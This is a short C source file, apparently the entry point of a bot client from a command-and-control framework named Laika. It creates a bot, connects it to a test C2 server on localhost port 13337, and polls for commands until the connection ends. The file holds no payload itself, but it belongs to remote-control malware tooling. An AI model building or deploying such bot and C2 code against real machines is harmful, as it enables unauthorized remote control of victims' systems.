#include <stdio.h>

#include "lerror.h"
#include "bot.h"

int main(int argv, char **argc) {
    struct sLaika_bot *bot = laikaB_newBot();

    /* connect to test CNC */
    laikaB_connectToCNC(bot, "127.0.0.1", "13337");

    /* while connection is still alive, poll bot */
    while (laikaS_isAlive((&bot->peer->sock))) {
        if (!laikaB_poll(bot, 1000)) {
            printf("no events!\n");
        }
    }

    printf("bot killed\n");
    return 0;
}